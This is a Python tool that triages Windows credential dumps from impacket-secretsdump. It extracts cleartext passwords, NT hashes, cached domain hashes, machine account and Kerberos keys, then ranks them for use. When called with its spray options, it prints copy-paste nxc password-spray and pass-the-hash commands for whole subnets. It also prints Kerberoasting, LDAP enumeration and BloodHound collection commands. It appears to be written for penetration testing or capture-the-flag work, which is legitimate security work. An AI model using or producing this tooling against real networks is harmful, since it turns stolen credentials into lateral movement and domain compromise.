#!/usr/bin/env python3
"""
sd_triage.py  v1.0  —  parse impacket-secretsdump output into clean, ranked,
ready-to-spray intel. Turns the wall into: cleartext creds, usable hashes,
what to crack, and copy-paste nxc spray lines.

  impacket-secretsdump ... | tee sd.txt
  python3 sd_triage.py sd.txt
  python3 sd_triage.py sd.txt --dc 10.10.10.10 --domain corp.local
  python3 sd_triage.py sd.txt --spray            # emit ready nxc commands
  cat sd.txt | python3 sd_triage.py

stdlib only. Local. Nothing uploaded.
"""
import sys, re, argparse

EMPTY_NT = "31d6cfe0d16ae931b73c59d7e0c089c0"   # NT hash of ""
C = {"crit": "91", "high": "93", "med": "96", "dim": "90", "ok": "92", "hdr": "36"}


def col(t, c, on=True):
    # accept either a raw ANSI code ("36") or a palette key ("hdr")
    code = C.get(c, c)
    return f"\x1b[{code}m{t}\x1b[0m" if on else t


def parse(text):
    out = {
        "cleartext": [],    # (user, password, source)
        "local_hashes": [], # (user, rid, nthash)
        "dcc2": [],         # (user, hash)
        "machine": [],      # (name, kind, value)
        "dpapi": [],        # (label, value)
        "kerb_keys": [],    # (principal, etype, key)
    }
    section = None
    for raw in text.splitlines():
        line = raw.rstrip()
        s = line.strip()
        if not s:
            continue

        # section markers from secretsdump
        m = re.match(r'\[\*\]\s+(.*)', s)
        if m:
            hdr = m.group(1).strip()
            if hdr.startswith("DefaultPassword"): section = "defpw"
            elif hdr.startswith("_SC_"):          section = "svc:" + hdr[4:]
            elif "Dumping cached" in hdr:          section = "dcc2"
            elif "Dumping LSA" in hdr:             section = "lsa"
            elif hdr.startswith("$MACHINE.ACC"):   section = "machine"
            elif hdr.startswith("DPAPI_"):         section = "dpapi:" + hdr
            elif hdr.startswith("NL$KM"):          section = "nlkm"
            elif "Dumping local SAM" in hdr:       section = "sam"
            else:                                   section = "other"
            continue

        # ---- SAM local hashes:  user:rid:lm:nt:::
        m = re.match(r'^([^:]+):(\d+):([0-9a-f]{32}):([0-9a-f]{32}):::', s, re.I)
        if m:
            user, rid, lm, nt = m.groups()
            if nt.lower() != EMPTY_NT:
                out["local_hashes"].append((user, rid, nt))
            continue

        # ---- cached domain creds (DCC2)
        m = re.search(r'(\$DCC2\$\S+)', s)
        if m:
            blob = m.group(1)
            um = re.search(r'#([^#]+)#', blob)
            user = um.group(1) if um else "?"
            out["dcc2"].append((user, blob))
            continue

        # ---- DefaultPassword cleartext:  domain\user:password
        if section == "defpw":
            m = re.match(r'^(.+?):(.+)$', s)
            if m and "\\" in m.group(1) or (m and re.match(r'^[\w.\\-]+$', m.group(1))):
                out["cleartext"].append((m.group(1), m.group(2), "DefaultPassword (autologon)"))
                continue

        # ---- _SC_<service> cleartext:  user:password
        if section and section.startswith("svc:"):
            m = re.match(r'^([^:]+):(.+)$', s)
            if m:
                out["cleartext"].append((m.group(1), m.group(2), "service: " + section[4:]))
                continue

        # ---- machine account (aes/des/plain/nt)
        m = re.match(r'^([\w.\\-]+\$):([\w-]+):(.+)$', s)
        if m and ("$" in m.group(1)):
            out["machine"].append((m.group(1), m.group(2), m.group(3)))
            continue
        m = re.match(r'^([\w.\\-]+\$):aad3b435\S+:([0-9a-f]{32}):::', s, re.I)
        if m:
            out["machine"].append((m.group(1), "nthash", m.group(2)))
            continue

        # ---- kerberos keys (celia.almeda:aes256-...:hexkey)
        m = re.match(r'^([\w.\\-]+):(aes\d+-cts[\w-]*|des-cbc-md5):([0-9a-f]+)$', s, re.I)
        if m:
            out["kerb_keys"].append(m.groups())
            continue

        # ---- dpapi keys
        if section and section.startswith("dpapi"):
            m = re.match(r'^(dpapi_\w+):(0x\S+)', s)
            if m:
                out["dpapi"].append(m.groups())
                continue

    # dedupe cleartext by (user,password)
    seen = set(); ct = []
    for u, p, src in out["cleartext"]:
        k = (u.lower(), p)
        if k not in seen:
            seen.add(k); ct.append((u, p, src))
    out["cleartext"] = ct
    return out


def short_user(u):
    return u.split("\\")[-1] if "\\" in u else u


def report(d, args):
    on = not args.no_color
    P = lambda t, c: print(col(t, c, on))

    print()
    P("=" * 60, "hdr")
    P(" secretsdump triage", "hdr")
    P("=" * 60, "hdr")

    # ---- cleartext (the jackpot) ----
    print()
    P("★ CLEARTEXT CREDENTIALS  (use immediately — no cracking)", "crit")
    if d["cleartext"]:
        for u, p, src in d["cleartext"]:
            print(f"   {col(u, C['ok'], on)} : {col(p, C['ok'], on)}   {col('(' + src + ')', C['dim'], on)}")
    else:
        P("   none found", "dim")

    # ---- local hashes ----
    print()
    P("LOCAL HASHES (SAM)  — PtH with --local-auth (empty-pw dropped)", "high")
    if d["local_hashes"]:
        for u, rid, nt in d["local_hashes"]:
            star = "  ← RID 500, likely reused domain-wide" if rid == "500" else ""
            print(f"   {u} (rid {rid}) : {nt}{col(star, C['crit'], on)}")
    else:
        P("   none (all empty)", "dim")

    # ---- cached / crack ----
    print()
    P("CACHED DOMAIN CREDS (DCC2)  — hashcat -m 2100, SLOW (crack only if no cleartext)", "med")
    if d["dcc2"]:
        for u, blob in d["dcc2"]:
            has_ct = any(short_user(cu).lower() == u.lower() for cu, _, _ in d["cleartext"])
            note = col("  (you already have cleartext — skip)", C['dim'], on) if has_ct else ""
            print(f"   {u}{note}")
    else:
        P("   none", "dim")

    # ---- machine acct ----
    if d["machine"]:
        print()
        P("MACHINE ACCOUNT  — silver ticket / S4U / RBCD later", "dim")
        for name, kind, val in d["machine"]:
            print(f"   {name} [{kind}] : {val[:48]}{'…' if len(val) > 48 else ''}")

    # ---- summary ----
    print()
    nct, nlh = len(d["cleartext"]), len(d["local_hashes"])
    P(f"summary: {nct} cleartext · {nlh} local hash · {len(d['dcc2'])} cached · {len(d['machine'])} machine", "hdr")

    # ---- spray commands ----
    if args.spray or args.dc:
        dc = args.dc or "<DC_IP>"
        dom = args.domain or "<DOMAIN>"
        sub = (args.dc.rsplit(".", 1)[0] + ".0/24") if args.dc else "<SUBNET>"
        print()
        P("─" * 60, "hdr")
        P(" READY-TO-SPRAY (copy/paste)", "hdr")
        P("─" * 60, "hdr")
        for u, p, src in d["cleartext"]:
            su = short_user(u)
            print(col(f"# {su} ({src})", C['dim'], on))
            print(f"nxc smb {dc} -u {su} -p '{p}' -d {dom}")
            print(f"nxc winrm {dc} -u {su} -p '{p}' -d {dom}")
            print(f"nxc smb {sub} -u {su} -p '{p}' -d {dom} --continue-on-success | grep -E '\\[\\+\\]|Pwn3d'")
            print()
        for u, rid, nt in d["local_hashes"]:
            print(col(f"# {u} local hash — PtH sweep", C['dim'], on))
            print(f"nxc smb {sub} -u {u} -H {nt} --local-auth --continue-on-success | grep Pwn3d")
            print()
        # enum + bloodhound off the first cleartext
        if d["cleartext"]:
            su = short_user(d["cleartext"][0][0]); p = d["cleartext"][0][1]
            print(col("# authenticated enum with the first cleartext cred", C['dim'], on))
            print(f"nxc ldap {dc} -u {su} -p '{p}' -d {dom} --users --groups")
            print(f"impacket-GetUserSPNs {dom}/{su}:'{p}' -dc-ip {dc} -request")
            print(f"nxc ldap {dc} -u {su} -p '{p}' -d {dom} --bloodhound --collection All --dns-server {dc}")


def main():
    ap = argparse.ArgumentParser(description="Triage impacket-secretsdump output.")
    ap.add_argument("file", nargs="?", help="secretsdump output (or stdin)")
    ap.add_argument("--dc", help="DC IP — enables ready-to-spray commands")
    ap.add_argument("--domain", help="domain (for spray commands)")
    ap.add_argument("--spray", action="store_true", help="emit spray commands even without --dc")
    ap.add_argument("--no-color", action="store_true")
    a = ap.parse_args()
    text = open(a.file, errors="ignore").read() if a.file else sys.stdin.read()
    report(parse(text), a)


if __name__ == "__main__":
    main()
